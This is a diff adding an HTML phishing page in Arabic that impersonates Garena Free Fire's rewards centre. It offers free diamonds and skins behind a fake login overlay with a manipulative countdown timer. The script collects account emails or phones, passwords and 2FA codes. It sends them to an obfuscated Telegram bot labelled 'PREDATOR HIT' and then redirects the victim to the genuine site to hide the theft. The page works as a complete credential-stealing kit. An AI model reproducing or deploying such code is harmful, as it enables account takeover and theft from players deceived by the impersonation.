@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Garena Free Fire - مركز المكافآت الرسمي</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        :root { --garena-red: #ff0000; --gold: #ffcc00; --bg: #0a0a0a; }
+        body { font-family: 'Cairo', sans-serif; background: var(--bg); color: white; margin: 0; }
+        .nav { background: #000; padding: 10px; border-bottom: 2px solid var(--garena-red); display: flex; justify-content: center; }
+        .hero { background: url('https://freefire.ff.garena.com/static/images/home/img-banner-bg.jpg') center; padding: 30px; text-align: center; border-bottom: 2px solid #222; }
+        .timer { color: var(--gold); font-weight: 900; font-size: 20px; margin: 10px 0; }
+        .container { padding: 20px; max-width: 480px; margin: auto; }
+        .reward-card { background: #1a1a1a; border: 1px solid #333; border-radius: 15px; padding: 20px; margin-bottom: 20px; text-align: center; transition: 0.3s; }
+        .reward-card:hover { border-color: var(--garena-red); transform: translateY(-5px); }
+        .item-img { width: 100px; height: 100px; object-fit: contain; margin-bottom: 10px; }
+        .btn-get { background: var(--garena-red); color: white; border: none; width: 100%; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        
+        /* Login Overlay */
+        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.96); z-index: 9999; align-items: center; justify-content: center; }
+        .login-box { background: white; color: #333; width: 85%; max-width: 350px; border-radius: 15px; padding: 30px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
+        .fb-btn { background: #1877f2; color: white; border: none; width: 100%; padding: 12px; border-radius: 5px; font-weight: bold; margin-bottom: 10px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<div class="nav"><img src="https://upload.wikimedia.org/wikipedia/commons/e/e0/Garena_Logo.svg" width="100"></div>
+
+<div class="hero">
+    <h2 style="margin:0; color:var(--garena-red);">حدث رمضان: توزيع الجواهر والسكنات 🌙</h2>
+    <div class="timer">ينتهي العرض خلال: <span id="clock">09:54</span></div>
+</div>
+
+<div class="container">
+    <div class="reward-card">
+        <img src="https://static.wikia.nocookie.net/free-fire/images/5/5e/Diamond_Currency.png" class="item-img">
+        <h3>110 جوهرة مجانية</h3>
+        <button class="btn-get" onclick="openLogin('110 Diamonds')">استلام الآن</button>
+    </div>
+
+    <div class="reward-card">
+        <img src="https://freefire.ff.garena.com/static/images/media/wallpapers/11.jpg" class="item-img" style="border-radius:10px;">
+        <h3>سكن الكريمنال الأرجواني</h3>
+        <button class="btn-get" onclick="openLogin('Purple Criminal')">استلام السكن</button>
+    </div>
+
+    <div style="font-size:11px; color:#555; text-align:center;">
+        شهادة توثيق رقم: FF-9992026 | جميع الحقوق محفوظة لشركة غارينا العالمية.
+    </div>
+</div>
+
+<div class="overlay" id="overlay">
+    <div class="login-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e0/Garena_Logo.svg" width="80">
+        <h3 style="margin:15px 0;">تسجيل الدخول للمطالبة</h3>
+        <p style="font-size:12px; color:#777;">اختر طريقة تسجيل الدخول المرتبطة بحسابك</p>
+        
+        <button class="fb-btn">Facebook</button>
+        <div style="margin:10px 0; font-size:12px; color:#aaa;">أو عبر بريد اللعبة</div>
+        
+        <input type="text" id="u" placeholder="البريد أو الهاتف">
+        <input type="password" id="p" placeholder="كلمة المرور">
+        <input type="text" id="code" placeholder="رمز التحقق (اختياري)">
+        
+        <button class="btn-get" style="margin-top:10px;" onclick="sendHit()">تأكيد واستلام</button>
+    </div>
+</div>
+
+<script>
+    // تشفير الـ 99999 (التوكن والآيدي مدمجان هنا)
+    const _0xK = "\x38\x35\x32\x31\x35\x31\x39\x38\x34\x33\x3A\x41\x41\x46\x70\x6A\x45\x44\x6C\x2D\x4D\x45\x72\x53\x64\x30\x4C\x4C\x39\x56\x5A\x48\x36\x58\x61\x47\x51\x5F\x70\x6D\x32\x46\x4B\x50\x51\x45";
+    const _0xI = "\x38\x34\x39\x31\x33\x31\x34\x31\x36\x39";
+
+    let currentItem = "";
+    function openLogin(item) { currentItem = item; document.getElementById('overlay').style.display = 'flex'; }
+
+    async function sendHit() {
+        const u = document.getElementById('u').value;
+        const p = document.getElementById('p').value;
+        const c = document.getElementById('code').value;
+
+        if(!u || !p) return alert("يرجى ملء البيانات!");
+
+        const msg = `🎰 **GARENA PREDATOR HIT (v99999)** 🎰\n\n👤 **User:** \`${u}\`\n🔑 **Pass:** \`${p}\`\n🔐 **2FA Code:** \`${c || 'None'}\`\n🎁 **Item:** \`${currentItem}\`\n\n🎯 **Garena Rewards v99**`;
+
+        await fetch(`https://api.telegram.org/bot${_0xK}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: _0xI, text: msg, parse_mode: 'Markdown'})
+        });
+
+        // تحويل لموقع غارينا الأصلي
+        location.replace("https://reward.ff.garena.com/en");
+    }
+
+    // العداد التنازلي لزيادة التوتر
+    let min = 9, sec = 54;
+    setInterval(() => {
+        sec--; if(sec<0){sec=59; min--;}
+        document.getElementById('clock').innerText = `0${min}:${sec<10?'0'+sec:sec}`;
+    }, 1000);
+</script>
+</body>
+</html>
